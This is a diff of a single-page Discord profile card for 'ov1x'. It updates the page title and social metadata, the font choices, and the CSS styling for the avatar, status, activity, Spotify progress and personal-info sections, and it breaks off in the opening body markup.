@@ -4,32 +4,31 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta http-equiv="
 <meta name="referrer" content="strict-origin-when-cross-origin">
 
 <!-- ═══ SEO ═══ -->
-<title>Live Portfolio — Discord Bio Card</title>
-<meta name="description" content="Live Discord portfolio bio card with real-time presence, activity tracking, and personal information. Built with Three.js and Lanyard API.">
-<meta name="keywords" content="discord, portfolio, bio card, live presence, lanyard">
-<meta name="author" content="Discord User">
+<title>ov1x · Live Discord Profile</title>
+<meta name="description" content="Live Discord profile card for ov1x — real-time presence, activity, and personal info.">
+<meta name="keywords" content="discord, portfolio, bio card, live presence, lanyard, ov1x">
+<meta name="author" content="ov1x">
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://ov1x.is-a.dev/">
 
-<!-- ═══ Open Graph / Social ═══ -->
+<!-- ═══ Open Graph ═══ -->
 <meta property="og:type" content="website">
-<meta property="og:title" content="Live Portfolio — Discord Bio Card">
-<meta property="og:description" content="Live Discord portfolio with real-time presence &amp; activity tracking.">
+<meta property="og:title" content="ov1x · Live Discord Profile">
+<meta property="og:description" content="Live Discord profile with real-time presence & activity tracking.">
 <meta property="og:url" content="https://ov1x.is-a.dev/">
 <meta property="og:locale" content="en_US">
-<meta name="theme-color" content="#0a0a0a">
+<meta name="theme-color" content="#060606">
 <meta name="color-scheme" content="dark">
 
 <!-- ═══ Twitter Card ═══ -->
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Live Portfolio — Discord Bio Card">
-<meta name="twitter:description" content="Live Discord portfolio with real-time presence &amp; activity tracking.">
+<meta name="twitter:title" content="ov1x · Live Discord Profile">
+<meta name="twitter:description" content="Live Discord profile with real-time presence & activity.">
 
-<!-- ═══ Performance hints ═══ -->
+<!-- ═══ Preconnects ═══ -->
 <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="preconnect" href="https://cdn.discordapp.com" crossorigin>
@@ -37,431 +36,970 @@
 <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
 <link rel="dns-prefetch" href="https://i.scdn.co">
 
-<!-- ═══ Fonts — display=swap for performance ═══ -->
-<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
-<noscript><link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet"></noscript>
+<!-- ═══ Fonts ═══ -->
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400&family=DM+Mono:wght@300;400&family=Outfit:wght@300;400;500&display=swap"
+  rel="stylesheet" media="print" onload="this.media='all'">
+<noscript>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400&family=DM+Mono:wght@300;400&family=Outfit:wght@300;400;500&display=swap" rel="stylesheet">
+</noscript>
 
-<!-- ═══ Favicon (dynamic) ═══ -->
-<link rel="icon" id="favicon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
+<!-- ═══ Favicon ═══ -->
+<link rel="icon" id="favicon" type="image/png"
+  href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
 
-<!-- ═══ Three.js — async ═══ -->
-
-
-<!-- ═══ Structured Data (JSON-LD) ═══ -->
+<!-- ═══ JSON-LD ═══ -->
 <script type="application/ld+json">
 {
-  "@context":"https://schema.org",
-  "@type":"Person",
-  "name":"Discord User",
-  "description":"Live portfolio bio card with Discord presence",
-  "url":"https://ov1x.is-a.dev/",
-  "sameAs":["https://discord.com"]
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "ov1x",
+  "description": "Live Discord bio card with real-time presence",
+  "url": "https://ov1x.is-a.dev/"
 }
 </script>
 
-<!-- ═══ Critical CSS ═══ -->
+<!-- ═══ CSS ═══ -->
 <style>
+/* ── Reset ── */
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+/* ── Design Tokens ── */
 :root{
-  --gold:#c8a84b;--gold2:#b8952e;
-  --gold-dim:rgba(200,168,75,.22);
-  --gold-glow:rgba(200,168,75,.05);
-  --gold-subtle:rgba(200,168,75,.08);
-  --bg:#060606;--card:rgba(10,10,10,.96);
-  --white:#ebebeb;--muted:rgba(235,235,235,.42);--muted2:rgba(235,235,235,.18);
-  --online:#3ba55c;--idle:#faa61a;--dnd:#ed4245;--offline:#555e6a;
-  --r:20px;--r-sm:10px;
+  --gold:       #c4a35a;
+  --gold-bright:#d4b86a;
+  --gold-dim:   rgba(196,163,90,.20);
+  --gold-glow:  rgba(196,163,90,.06);
+  --gold-subtle:rgba(196,163,90,.08);
+  --gold-muted: rgba(196,163,90,.40);
+
+  --bg:         #060606;
+  --bg2:        #0c0c0c;
+  --card-bg:    rgba(11,11,11,.97);
+  --card-border:rgba(196,163,90,.14);
+
+  --white:  #f0ece4;
+  --muted:  rgba(240,236,228,.45);
+  --muted2: rgba(240,236,228,.20);
+  --muted3: rgba(240,236,228,.10);
+
+  --online: #3ba55c;
+  --idle:   #faa61a;
+  --dnd:    #ed4245;
+  --offline:#4e5761;
+
+  --r:  18px;
+  --r2: 10px;
+  --r3:  7px;
+
+  --font-display: 'Cormorant Garamond', Georgia, serif;
+  --font-body:    'Outfit', sans-serif;
+  --font-mono:    'DM Mono', monospace;
+
+  --ease-out-expo: cubic-bezier(.16,1,.3,1);
+  --ease-spring:   cubic-bezier(.34,1.56,.64,1);
 }
-html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);font-family:'Poppins',sans-serif;color:var(--white);-webkit-font-smoothing:antialiased;user-select:none;-webkit-user-select:none;}
 
-/* ── Loading ── */
-#loading{position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px;transition:opacity .9s ease;}
-#loading.hide{opacity:0;pointer-events:none;}
-.ld-r{width:34px;height:34px;border-radius:50%;border:1px solid rgba(200,168,75,.08);border-top-color:rgba(200,168,75,.6);animation:spin .9s linear infinite;}
-.ld-t{font-size:7px;letter-spacing:5.5px;text-transform:uppercase;color:rgba(200,168,75,.35);animation:blink 2s ease-in-out infinite;}
+/* ── Base ── */
+html,body{
+  width:100%;height:100%;
+  overflow:hidden;
+  background:var(--bg);
+  font-family:var(--font-body);
+  color:var(--white);
+  -webkit-font-smoothing:antialiased;
+  -moz-osx-font-smoothing:grayscale;
+  user-select:none;
+  -webkit-user-select:none;
+}
+
+/* ── Skip Link ── */
+.skip-link{
+  position:absolute;top:-100%;left:8px;
+  background:var(--gold);color:#000;
+  padding:6px 14px;border-radius:6px;
+  font-size:12px;font-weight:600;
+  z-index:99999;text-decoration:none;
+  transition:top .2s;
+}
+.skip-link:focus{top:8px;}
+
+/* ── Loading Screen ── */
+#loading{
+  position:fixed;inset:0;z-index:9999;
+  background:var(--bg);
+  display:flex;align-items:center;justify-content:center;
+  flex-direction:column;gap:18px;
+  transition:opacity 1s var(--ease-out-expo);
+}
+#loading.fade{opacity:0;pointer-events:none;}
+
+.ld-icon{
+  width:40px;height:40px;
+  border-radius:50%;
+  border:1px solid rgba(196,163,90,.06);
+  border-top-color:rgba(196,163,90,.55);
+  animation:spin .85s linear infinite;
+}
+.ld-wordmark{
+  font-family:var(--font-mono);
+  font-size:8px;letter-spacing:5px;
+  text-transform:uppercase;
+  color:var(--gold-muted);
+  opacity:.5;
+  animation:pulse 2.4s ease-in-out infinite;
+}
 @keyframes spin{to{transform:rotate(360deg)}}
-@keyframes blink{0%,100%{opacity:.25}50%{opacity:.9}}
+@keyframes pulse{0%,100%{opacity:.2}50%{opacity:.7}}
 
-/* ── BG & Vignette ── */
+/* ── Canvas Background ── */
 #bg{position:fixed;inset:0;z-index:0;}
-#vig{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse at center,transparent 10%,rgba(0,0,0,.8) 100%);}
+
+/* ── Vignette ── */
+#vig{
+  position:fixed;inset:0;z-index:1;
+  pointer-events:none;
+  background:
+    radial-gradient(ellipse at center, transparent 0%, rgba(0,0,0,.75) 100%),
+    radial-gradient(ellipse at 50% 0%, rgba(196,163,90,.025) 0%, transparent 60%);
+}
 
 /* ── Scene ── */
-.scene{position:fixed;inset:0;z-index:2;display:flex;align-items:center;justify-content:center;}
-.cw{perspective:1400px;opacity:0;animation:fadeUp .9s cubic-bezier(.22,1,.36,1) .4s forwards,float 8s ease-in-out 1.3s infinite;}
-@keyframes fadeUp{from{opacity:0;transform:translateY(32px)}to{opacity:1;transform:translateY(0)}}
-@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
+.scene{
+  position:fixed;inset:0;z-index:2;
+  display:flex;align-items:center;justify-content:center;
+  padding:16px;
+}
+
+.cw{
+  perspective:1600px;
+  opacity:0;
+  animation:
+    appear .8s var(--ease-out-expo) .3s forwards,
+    float 9s ease-in-out 1.1s infinite;
+}
+@keyframes appear{
+  from{opacity:0;transform:translateY(28px) scale(.98)}
+  to  {opacity:1;transform:translateY(0)  scale(1)}
+}
+@keyframes float{
+  0%,100%{transform:translateY(0)}
+  50%    {transform:translateY(-10px)}
+}
 
 /* ── Card ── */
 .card{
-  position:relative;width:355px;max-height:92vh;
-  overflow-y:auto;overflow-x:hidden;
-  padding:30px 26px 24px;
-  background:var(--card);
-  backdrop-filter:blur(40px) saturate(1.5);
-  -webkit-backdrop-filter:blur(40px) saturate(1.5);
+  position:relative;
+  width:360px;
+  max-height:92vh;
+  overflow-y:auto;
+  overflow-x:hidden;
+  padding:32px 24px 26px;
+  background:var(--card-bg);
+  backdrop-filter:blur(48px) saturate(1.6);
+  -webkit-backdrop-filter:blur(48px) saturate(1.6);
   border-radius:var(--r);
-  border:1px solid rgba(200,168,75,.16);
+  border:1px solid var(--card-border);
   transform-style:preserve-3d;
-  transition:transform .14s ease;
+  transition:transform .12s ease, box-shadow .3s ease;
   box-shadow:
-    0 0 0 1px rgba(0,0,0,.9),
-    0 30px 80px rgba(0,0,0,.98),
-    0 0 60px rgba(0,0,0,.6),
-    inset 0 0 100px var(--gold-glow);
+    0 0 0 1px rgba(0,0,0,.8),
+    0 40px 100px rgba(0,0,0,.96),
+    0 0 80px rgba(0,0,0,.5),
+    inset 0 0 120px var(--gold-glow);
   scrollbar-width:none;
 }
 .card::-webkit-scrollbar{display:none;}
+.card:focus-visible{outline:1px solid rgba(196,163,90,.4);outline-offset:4px;}
 
 /* rotating border beam */
 @property --ba{syntax:'<angle>';initial-value:0deg;inherits:false;}
-.cb{
+.beam{
   position:absolute;inset:-1px;
-  border-radius:calc(var(--r)+1px);
-  background:conic-gradient(from var(--ba),transparent 0%,transparent 42%,rgba(200,168,75,.65) 50%,transparent 58%,transparent 100%);
+  border-radius:calc(var(--r) + 1px);
+  background:conic-gradient(
+    from var(--ba),
+    transparent 0%,transparent 40%,
+    rgba(196,163,90,.7) 50%,
+    transparent 60%,transparent 100%
+  );
   -webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);
   -webkit-mask-composite:xor;mask-composite:exclude;
-  animation:rcb 6s linear infinite;
-  pointer-events:none;z-index:3;
+  animation:beam-rotate 7s linear infinite;
+  pointer-events:none;z-index:0;
 }
-@keyframes rcb{to{--ba:360deg}}
+@keyframes beam-rotate{to{--ba:360deg}}
 
-/* top shimmer */
+/* top shimmer line */
 .card::before{
-  content:'';position:absolute;top:0;left:12%;right:12%;height:1px;z-index:4;pointer-events:none;
-  background:linear-gradient(90deg,transparent,rgba(200,168,75,.7),transparent);
-  animation:shim 5s ease-in-out infinite;
+  content:'';
+  position:absolute;top:0;left:15%;right:15%;height:1px;
+  z-index:4;pointer-events:none;
+  background:linear-gradient(90deg,transparent,rgba(196,163,90,.65),transparent);
+  animation:shimmer-top 6s ease-in-out infinite;
 }
-@keyframes shim{0%,100%{opacity:.15;left:22%;right:22%}50%{opacity:.8;left:6%;right:6%}}
+@keyframes shimmer-top{
+  0%,100%{opacity:.1;left:25%;right:25%}
+  50%    {opacity:.7;left:8%; right:8%}
+}
 
-/* top glow */
+/* top ambient glow */
 .card::after{
-  content:'';position:absolute;inset:0;border-radius:var(--r);z-index:0;pointer-events:none;
-  background:radial-gradient(ellipse at 50% -8%,rgba(200,168,75,.09) 0%,transparent 52%);
+  content:'';
+  position:absolute;inset:0;border-radius:var(--r);
+  z-index:0;pointer-events:none;
+  background:radial-gradient(ellipse at 50% -5%,rgba(196,163,90,.08) 0%,transparent 55%);
 }
-.card>*{position:relative;z-index:2;}
+.card > *{position:relative;z-index:2;}
 
 /* ── Eyebrow ── */
 .eyebrow{
-  text-align:center;font-size:7px;font-weight:600;letter-spacing:6px;
-  text-transform:uppercase;color:var(--gold);opacity:.4;margin-bottom:20px;
+  text-align:center;
+  font-family:var(--font-mono);
+  font-size:7px;font-weight:400;letter-spacing:5.5px;
+  text-transform:uppercase;
+  color:var(--gold);opacity:.38;
+  margin-bottom:22px;
 }
 
 /* ── Avatar ── */
-.av-out{position:relative;width:86px;height:86px;margin:0 auto 14px;}
-.av-ring{position:absolute;inset:-8px;width:calc(100%+16px);height:calc(100%+16px);animation:sr 5s linear infinite;pointer-events:none;}
-@keyframes sr{to{transform:rotate(360deg)}}
-.av-in{position:relative;width:86px;height:86px;}
-.av{width:86px;height:86px;border-radius:50%;object-fit:cover;display:block;border:2px solid rgba(200,168,75,.15);background:#111;transition:border-color .5s;}
-.sdot{position:absolute;bottom:2px;right:2px;width:15px;height:15px;border-radius:50%;border:2.5px solid #090909;background:var(--offline);transition:background .4s,box-shadow .4s;}
-.sdot.online{background:var(--online);box-shadow:0 0 10px var(--online);}
-.sdot.idle{background:var(--idle);box-shadow:0 0 10px var(--idle);}
-.sdot.dnd{background:var(--dnd);box-shadow:0 0 10px var(--dnd);}
-
-/* ── Name & Tag ── */
-.dname{font-family:'Cinzel',serif;font-size:19px;font-weight:600;text-align:center;letter-spacing:2px;margin-bottom:3px;line-height:1.25;}
-.utag{
-  font-size:10px;font-weight:300;text-align:center;color:var(--muted);
-  margin-bottom:9px;letter-spacing:.3px;cursor:pointer;
-  display:inline-block;width:100%;transition:color .2s;
+.av-wrap{
   position:relative;
+  width:88px;height:88px;
+  margin:0 auto 16px;
 }
-.utag:hover{color:rgba(200,168,75,.7);}
+.av-ring{
+  position:absolute;inset:-9px;
+  width:calc(100% + 18px);height:calc(100% + 18px);
+  animation:ring-spin 6s linear infinite;
+  pointer-events:none;
+}
+@keyframes ring-spin{to{transform:rotate(360deg)}}
+
+.av{
+  display:block;
+  width:88px;height:88px;
+  border-radius:50%;
+  object-fit:cover;
+  border:2px solid rgba(196,163,90,.12);
+  background:#111;
+  transition:border-color .5s ease;
+}
+.sdot{
+  position:absolute;bottom:2px;right:2px;
+  width:16px;height:16px;
+  border-radius:50%;
+  border:2.5px solid #070707;
+  background:var(--offline);
+  transition:background .4s ease, box-shadow .4s ease;
+}
+.sdot.online {background:var(--online);box-shadow:0 0 12px rgba(59,165,92,.5);}
+.sdot.idle   {background:var(--idle);  box-shadow:0 0 12px rgba(250,166,26,.5);}
+.sdot.dnd    {background:var(--dnd);   box-shadow:0 0 12px rgba(237,66,69,.5);}
+
+/* ── Name & Handle ── */
+.dname{
+  font-family:var(--font-display);
+  font-size:22px;font-weight:600;
+  text-align:center;letter-spacing:2.5px;
+  margin-bottom:4px;line-height:1.2;
+  color:var(--white);
+}
+.handle{
+  font-family:var(--font-mono);
+  font-size:10px;font-weight:300;
+  text-align:center;color:var(--muted);
+  letter-spacing:.4px;margin-bottom:9px;
+  cursor:pointer;transition:color .2s;
+  display:block;width:100%;
+}
+.handle:hover{color:rgba(196,163,90,.7);}
 
 /* ── Status line ── */
-.sline{display:flex;align-items:center;justify-content:center;gap:6px;font-size:10.5px;font-weight:500;margin-bottom:7px;}
-.spip{width:6px;height:6px;border-radius:50%;background:var(--offline);flex-shrink:0;transition:background .4s,box-shadow .4s;}
-.sval{color:var(--muted);transition:color .4s;}
-
-/* ── Custom status ── */
-.cs{
-  display:flex;align-items:center;justify-content:center;gap:5px;
-  text-align:center;font-size:10.5px;font-weight:300;font-style:italic;
-  color:rgba(200,168,75,.55);margin-bottom:14px;min-height:17px;
-  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;padding:0 8px;
+.sline{
+  display:flex;align-items:center;justify-content:center;
+  gap:6px;margin-bottom:7px;
 }
-.cs-emoji{width:16px;height:16px;object-fit:contain;vertical-align:middle;flex-shrink:0;}
+.spip{
+  width:6px;height:6px;border-radius:50%;
+  background:var(--offline);flex-shrink:0;
+  transition:background .4s ease, box-shadow .4s ease;
+}
+.spip.online {background:var(--online);box-shadow:0 0 8px rgba(59,165,92,.6);}
+.spip.idle   {background:var(--idle);  box-shadow:0 0 8px rgba(250,166,26,.6);}
+.spip.dnd    {background:var(--dnd);   box-shadow:0 0 8px rgba(237,66,69,.6);}
+.sval{
+  font-family:var(--font-mono);
+  font-size:10px;font-weight:300;
+  color:var(--muted);transition:color .4s ease;letter-spacing:.5px;
+}
+
+/* ── Custom Status ── */
+.cstatus{
+  display:flex;align-items:center;justify-content:center;gap:5px;
+  font-family:var(--font-body);
+  font-size:11px;font-weight:300;font-style:italic;
+  color:rgba(196,163,90,.52);
+  margin-bottom:16px;min-height:17px;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+  padding:0 10px;
+}
+.cs-emoji{width:15px;height:15px;object-fit:contain;vertical-align:middle;flex-shrink:0;}
 
 /* ── DM Button ── */
 .dm-btn{
-  display:flex;align-items:center;justify-content:center;gap:8px;
-  width:100%;padding:10px 14px;
-  background:rgba(255,255,255,.025);
-  border:1px solid rgba(200,168,75,.15);
-  border-radius:var(--r-sm);
-  color:rgba(235,235,235,.6);
-  font-family:'Poppins',sans-serif;
-  font-size:11px;font-weight:500;letter-spacing:.6px;
+  display:flex;align-items:center;justify-content:center;gap:9px;
+  width:100%;padding:11px 16px;
+  background:rgba(255,255,255,.022);
+  border:1px solid rgba(196,163,90,.14);
+  border-radius:var(--r2);
+  color:rgba(240,236,228,.55);
+  font-family:var(--font-body);
+  font-size:11.5px;font-weight:400;letter-spacing:.7px;
   text-decoration:none;cursor:pointer;
-  transition:background .25s,border-color .25s,color .25s,box-shadow .25s;
-  margin-bottom:14px;
+  transition:background .25s, border-color .25s, color .25s, box-shadow .25s;
+  margin-bottom:16px;
   position:relative;overflow:hidden;
 }
 .dm-btn::before{
   content:'';position:absolute;inset:0;
-  background:linear-gradient(90deg,transparent 0%,rgba(200,168,75,.04) 50%,transparent 100%);
-  transform:translateX(-100%);transition:transform .5s ease;
+  background:linear-gradient(90deg,transparent,rgba(196,163,90,.055),transparent);
+  transform:translateX(-110%);
+  transition:transform .55s ease;
 }
-.dm-btn:hover::before{transform:translateX(100%);}
+.dm-btn:hover::before{transform:translateX(110%);}
 .dm-btn:hover{
-  background:rgba(255,255,255,.04);
-  border-color:rgba(200,168,75,.3);
-  color:rgba(235,235,235,.88);
-  box-shadow:0 0 18px rgba(200,168,75,.06);
+  background:rgba(255,255,255,.038);
+  border-color:rgba(196,163,90,.28);
+  color:rgba(240,236,228,.85);
+  box-shadow:0 0 20px rgba(196,163,90,.06);
 }
-.dm-icon{flex-shrink:0;opacity:.65;transition:opacity .25s;}
-.dm-btn:hover .dm-icon{opacity:.9;}
+.dm-icon{flex-shrink:0;opacity:.6;transition:opacity .25s;}
+.dm-btn:hover .dm-icon{opacity:.85;}
 .dm-arr{
-  margin-left:auto;font-size:10px;opacity:.35;
-  transition:transform .25s,opacity .25s;
+  margin-left:auto;font-size:10px;opacity:.3;
+  transition:transform .25s, opacity .25s;
 }
-.dm-btn:hover .dm-arr{transform:translateX(3px);opacity:.65;}
+.dm-btn:hover .dm-arr{transform:translateX(4px);opacity:.6;}
 
 /* ── Divider ── */
-.div{height:1px;background:linear-gradient(90deg,transparent,var(--gold-dim),transparent);margin:0 0 14px;}
-hr.div{border:none;height:1px;background:linear-gradient(90deg,transparent,var(--gold-dim),transparent);margin:0 0 14px;}
+.divider{
+  height:1px;border:none;
+  background:linear-gradient(90deg,transparent,var(--gold-dim),transparent);
+  margin:0 0 14px;
+}
 
-/* ── Section label ── */
-.slbl{font-size:7px;font-weight:600;letter-spacing:4.5px;text-transform:uppercase;color:var(--gold);opacity:.45;margin-bottom:9px;}
+/* ── Section Label ── */
+.sec-lbl{
+  font-family:var(--font-mono);
+  font-size:7.5px;font-weight:400;letter-spacing:4.5px;
+  text-transform:uppercase;
+  color:var(--gold);opacity:.42;
+  margin-bottom:10px;
+}
 
-/* ── Activity tile ── */
+/* ── Activity Tile ── */
 .atile{
-  display:flex;gap:10px;align-items:flex-start;
-  background:rgba(255,255,255,.02);
-  border:1px solid rgba(255,255,255,.035);
-  border-radius:var(--r-sm);padding:10px 11px;
-  transition:background .3s,border-color .3s;
-}
-.atile:hover{background:rgba(255,255,255,.035);border-color:rgba(200,168,75,.1);}
-.ath{width:44px;height:44px;border-radius:8px;flex-shrink:0;background:var(--gold-subtle);display:flex;align-items:center;justify-content:center;font-size:20px;overflow:hidden;}
-.ath img{width:100%;height:100%;object-fit:cover;border-radius:7px;}
-.ainf{flex:1;min-width:0;}
-.an{font-size:12px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:2px;}
-.ad{font-size:10px;font-weight:300;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;line-height:1.5;}
-.ae{font-size:9px;font-weight:500;color:rgba(200,168,75,.45);margin-top:3px;}
-.no-a{text-align:center;font-size:10.5px;font-weight:300;font-style:italic;color:var(--muted2);padding:14px 0;letter-spacing:1px;}
-
-/* ── Spotify progress ── */
-.spbar{margin-top:6px;height:1.5px;border-radius:1px;background:rgba(255,255,255,.06);overflow:hidden;}
-.spprog{height:100%;border-radius:1px;background:linear-gradient(90deg,var(--gold2),var(--gold));transition:width 1s linear;}
-
-/* ── Personal Info ── */
-.pi-grid{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:0;}
-.pi-item{
+  display:flex;gap:11px;align-items:flex-start;
   background:rgba(255,255,255,.018);
-  border:1px solid rgba(255,255,255,.032);
-  border-radius:9px;padding:9px 10px;
-  transition:background .3s,border-color .3s;
+  border:1px solid rgba(255,255,255,.03);
+  border-radius:var(--r2);
+  padding:11px 12px;
+  transition:background .3s, border-color .3s;
 }
-.pi-item:hover{background:rgba(255,255,255,.032);border-color:rgba(200,168,75,.1);}
+.atile:hover{
+  background:rgba(255,255,255,.03);
+  border-color:rgba(196,163,90,.09);
+}
+.atile + .atile{margin-top:7px;}
+
+.a-thumb{
+  width:46px;height:46px;border-radius:8px;flex-shrink:0;
+  background:var(--gold-subtle);
+  display:flex;align-items:center;justify-content:center;
+  font-size:22px;overflow:hidden;
+  border:1px solid rgba(255,255,255,.04);
+}
+.a-thumb img{width:100%;height:100%;object-fit:cover;border-radius:7px;}
+
+.a-info{flex:1;min-width:0;}
+.a-name{
+  font-family:var(--font-body);
+  font-size:12px;font-weight:500;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+  margin-bottom:2px;color:var(--white);
+}
+.a-detail{
+  font-size:10.5px;font-weight:300;
+  color:var(--muted);line-height:1.55;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+}
+.a-elapsed{
+  font-family:var(--font-mono);
+  font-size:9px;font-weight:300;
+  color:rgba(196,163,90,.42);
+  margin-top:4px;letter-spacing:.3px;
+}
+.no-activity{
+  text-align:center;
+  font-family:var(--font-mono);
+  font-size:10px;font-weight:300;font-style:italic;
+  color:var(--muted2);
+  padding:16px 0;letter-spacing:1px;
+}
+
+/* ── Spotify Progress ── */
+.sp-bar{
+  margin-top:7px;
+  height:1.5px;border-radius:1px;
+  background:rgba(255,255,255,.05);
+  overflow:hidden;
+}
+.sp-prog{
+  height:100%;border-radius:1px;
+  background:linear-gradient(90deg,rgba(196,163,90,.5),var(--gold));
+  transition:width 1s linear;
+}
+
+/* ── Personal Info Grid ── */
+.pi-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:7px;
+}
+.pi-item{
+  background:rgba(255,255,255,.016);
+  border:1px solid rgba(255,255,255,.028);
+  border-radius:var(--r3);
+  padding:10px 11px;
+  transition:background .3s, border-color .3s;
+}
+.pi-item:hover{
+  background:rgba(255,255,255,.028);
+  border-color:rgba(196,163,90,.09);
+}
 .pi-item.full{grid-column:1/-1;}
-.pi-lbl{font-size:7px;font-weight:600;letter-spacing:3.5px;text-transform:uppercase;color:var(--gold);opacity:.45;margin-bottom:4px;}
-.pi-val{font-size:11px;font-weight:400;color:var(--white);line-height:1.45;}
-.pi-val.muted{color:var(--muted);font-style:italic;font-size:10px;}
-.pi-tags{display:flex;flex-wrap:wrap;gap:4px;margin-top:3px;list-style:none;}
-.pi-tag{
-  display:inline-flex;align-items:center;gap:3px;
-  font-size:9px;font-weight:500;padding:3px 8px;border-radius:20px;
-  background:rgba(200,168,75,.055);
-  border:1px solid rgba(200,168,75,.15);
-  color:rgba(200,168,75,.75);letter-spacing:.3px;
-  transition:all .22s;
+.pi-lbl{
+  font-family:var(--font-mono);
+  font-size:7px;font-weight:400;letter-spacing:3.5px;
+  text-transform:uppercase;
+  color:var(--gold);opacity:.42;
+  margin-bottom:5px;
 }
-.pi-tag:hover{background:rgba(200,168,75,.12);border-color:rgba(200,168,75,.35);color:rgba(200,168,75,.95);}
-.pi-tag:focus{outline:1px solid var(--gold);}
+.pi-val{
+  font-size:11.5px;font-weight:400;
+  color:var(--white);line-height:1.5;
+}
+.pi-val.muted{
+  color:var(--muted);font-style:italic;font-size:10.5px;
+}
+.pi-sub{
+  display:block;
+  font-size:9.5px;color:var(--muted);margin-top:1px;
+}
 
-/* ── Footer ── */
-.cf{margin-top:16px;display:flex;align-items:center;justify-content:center;gap:6px;}
-.fdot{width:2.5px;height:2.5px;border-radius:50%;background:rgba(200,168,75,.18);}
-.fl{flex:1;height:1px;background:linear-gradient(90deg,transparent,rgba(200,168,75,.15));}
-.flr{flex:1;height:1px;background:linear-gradient(90deg,rgba(200,168,75,.15),transparent);}
-.flbl{font-size:6.5px;letter-spacing:4px;text-transform:uppercase;color:rgba(200,168,75,.22);font-weight:500;}
+/* ── Tag Pills ── */
+.tag-list{
+  display:flex;flex-wrap:wrap;gap:4px;
+  margin-top:3px;list-style:none;
+}
+.tag{
+  display:inline-flex;align-items:center;gap:3px;
+  font-family:var(--font-mono);
+  font-size:9px;font-weight:300;
+  padding:3px 9px;border-radius:20px;
+  background:rgba(196,163,90,.045);
+  border:1px solid rgba(196,163,90,.13);
+  color:rgba(196,163,90,.72);
+  letter-spacing:.3px;
+  transition:background .22s, border-color .22s, color .22s;
+}
+.tag:hover{
+  background:rgba(196,163,90,.10);
+  border-color:rgba(196,163,90,.32);
+  color:rgba(196,163,90,.95);
+}
 
-/* ── Skip link ── */
-.skip-link{position:absolute;top:-100%;left:8px;background:var(--gold);color:#000;padding:6px 14px;border-radius:6px;font-size:12px;font-weight:600;z-index:99999;transition:top .2s;text-decoration:none;}
-.skip-link:focus{top:8px;}
-.card:focus{outline:1px solid rgba(200,168,75,.4);outline-offset:3px;}
+/* ── Card Footer ── */
+.card-footer{
+  margin-top:18px;
+  display:flex;align-items:center;justify-content:center;gap:7px;
+}
+.ft-line{
+  flex:1;height:1px;
+  background:linear-gradient(90deg,transparent,rgba(196,163,90,.12));
+}
+.ft-line.r{background:linear-gradient(90deg,rgba(196,163,90,.12),transparent);}
+.ft-dot{width:2px;height:2px;border-radius:50%;background:rgba(196,163,90,.18);}
+.ft-text{
+  font-family:var(--font-mono);
+  font-size:6.5px;letter-spacing:4px;
+  text-transform:uppercase;
+  color:rgba(196,163,90,.20);font-weight:400;
+}
 
 /* ── Responsive ── */
 @media(max-width:390px){
-  .card{width:300px;padding:22px 16px 18px;}
-  .dname{font-size:17px;}
-  .av{width:74px;height:74px;}
-  .av-out,.av-in{width:74px;height:74px;}
+  .card{width:310px;padding:24px 16px 20px;}
+  .dname{font-size:19px;}
+  .av,.av-wrap{width:78px;height:78px;}
 }
-@media(min-width:900px){.card{width:372px;}}
+@media(min-width:900px){.card{width:376px;}}
 </style>
-<script>if(window.performance&&performance.mark)performance.mark('app-start');</script>
 </head>
 <body>
 
-<div id="loading" role="status" aria-live="polite" aria-label="Loading Discord presence"><div class="ld-r" aria-hidden="true"></div><div class="ld-t">Connecting to Discord</div></div>
+<a href="#card" class="skip-link">Skip to content</a>
 
+<!-- Loading -->
+<div id="loading" role="status" aria-live="polite" aria-label="Loading Discord presence">
+  <div class="ld-icon" aria-hidden="true"></div>
+  <div class="ld-wordmark">Connecting to Discord</div>
+</div>
+
+<!-- Three.js Canvas Background -->
 <canvas id="bg" aria-hidden="true" role="presentation"></canvas>
 <div id="vig" aria-hidden="true"></div>
 
+<!-- Scene -->
 <div class="scene" role="main">
   <div class="cw" id="cw">
     <div class="card" id="card" role="article" aria-label="Discord Bio Card" tabindex="0">
-      <div class="cb" aria-hidden="true"></div>
+      <div class="beam" aria-hidden="true"></div>
 
       <p class="eyebrow" aria-hidden="true">Live Portfolio</p>
 
-      <div class="av-out">
